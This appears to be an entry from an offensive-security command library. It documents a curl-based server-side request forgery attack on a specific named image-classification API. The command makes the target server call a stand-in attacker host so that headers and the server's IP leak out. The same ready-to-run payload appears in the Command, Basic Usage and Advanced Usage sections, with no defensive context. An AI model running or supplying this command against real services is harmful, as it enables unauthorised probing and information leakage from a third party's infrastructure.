---
id: cmd-curl-ssrf-external-001
data: >-
  curl -X POST https://iris.lystit.com/models/default/classification/color -H
  "Content-Type: application/json" -d '{"images":
  ["http://your-attacker-server.com/capture"]}'
tags:
  - ssrf
  - leakage
type: command
output: Classification response; leakage on attacker server
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.467Z'
verified: false
validated: true
submitted: true
---
# curl-post-ssrf-external

## Command

```bash
curl -X POST https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://your-attacker-server.com/capture"]}'
```

## Description

This command triggers SSRF to an external attacker server, leaking internal details via the outbound request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | JSON header | Yes |
| `-d '{...}'` | Payload with external URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://your-attacker-server.com/capture"]}'
```

### Advanced Usage

```bash
curl -X POST -v https://iris.lystit.com/models/default/classification/color -H "Content-Type: application/json" -d '{"images": ["http://your-attacker-server.com/capture"]}'
```

## Expected Output

API response with classification; check attacker server for leaked headers and IP.

## Related

- [[Related Procedure: Demonstrate Information Leakage via SSRF in Lyst Iris]]
